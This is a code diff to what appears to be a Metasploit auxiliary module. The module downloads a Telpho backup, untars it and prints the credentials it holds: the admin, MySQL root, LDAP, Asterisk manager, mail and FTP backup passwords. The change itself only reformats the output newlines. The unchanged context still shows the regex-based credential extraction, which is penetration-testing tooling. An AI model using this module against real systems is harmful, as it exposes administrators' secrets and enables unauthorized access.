@@ -67,40 +67,40 @@ class MetasploitModule < Msf::Auxiliary
     end
     file.close
 
-    puts
+
     print_status('Login (/telpho/login.php)')
     print_status('-------------------------')
     print_good('Username: ' + config.first[/adminusername\',\'(.*?)\'/, 1])
-    print_good('Password: ' + config.first[/adminpassword\',\'(.*?)\'/, 1])
-    puts
+    print_good('Password: ' + config.first[/adminpassword\',\'(.*?)\'/, 1] + "\n")
+
     print_status('MySQL (/phpmyadmin)')
     print_status('-------------------')
     print_good('Username: root')
-    print_good('Password: ' + config.first[/dbpassword\',\'(.*?)\'/, 1])
-    puts
+    print_good('Password: ' + config.first[/dbpassword\',\'(.*?)\'/, 1] + "\n")
+
     print_status('LDAP (/phpldapadmin)')
     print_status('--------------------')
     print_good('Username: ' + 'cn=admin,dc=localdomain')
-    print_good('Password: ' + config.first[/ldappassword\',\'(.*?)\'/, 1])
-    puts
+    print_good('Password: ' + config.first[/ldappassword\',\'(.*?)\'/, 1] + "\n")
+
     asterisk_header = 'Asterisk MI (port 5038)'
     print_status(asterisk_header)
     print_status('-' * asterisk_header.length)
     print_good('Username: ' + config.first[/manageruser\',\'(.*?)\'/, 1])
-    print_good('Password: ' + config.first[/managersecret\',\'(.*?)\'/, 1])
-    puts
+    print_good('Password: ' + config.first[/managersecret\',\'(.*?)\'/, 1] + "\n")
+
     print_status('Mail configuration')
     print_status('------------------')
     print_good('Mailserver: ' + config.first[/ipsmarthost\',\'(.*?)\'/, 1])
     print_good('Username:   ' + config.first[/mailusername\',\'(.*?)\'/, 1])
     print_good('Password:   ' + config.first[/mailpassword\',\'(.*?)\'/, 1])
-    print_good('Mail from:  ' + config.first[/mailfrom\',\'(.*?)\'/, 1])
-    puts
+    print_good('Mail from:  ' + config.first[/mailfrom\',\'(.*?)\'/, 1] + "\n")
+
     print_status('Online Backup')
     print_status('-------------')
     print_good('ID:        ' + config.first[/ftpbackupid\',\'(.*?)\'/, 1])
-    print_good('Password:  ' + config.first[/ftpbackuppw\',\'(.*?)\'/, 1])
-    puts
+    print_good('Password:  ' + config.first[/ftpbackuppw\',\'(.*?)\'/, 1] + "\n")
+
   end
 
   def run
@@ -139,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
       extracted = untar("#{path}")
       mysql = untar("#{extracted}/mysql.tar")
 
-      print_status('Dumping credentials')
+      print_status('Dumping credentials' + "\n")
       dump_creds("#{mysql}/mysql.epb")
     else
       print_error('Failed to download file.')
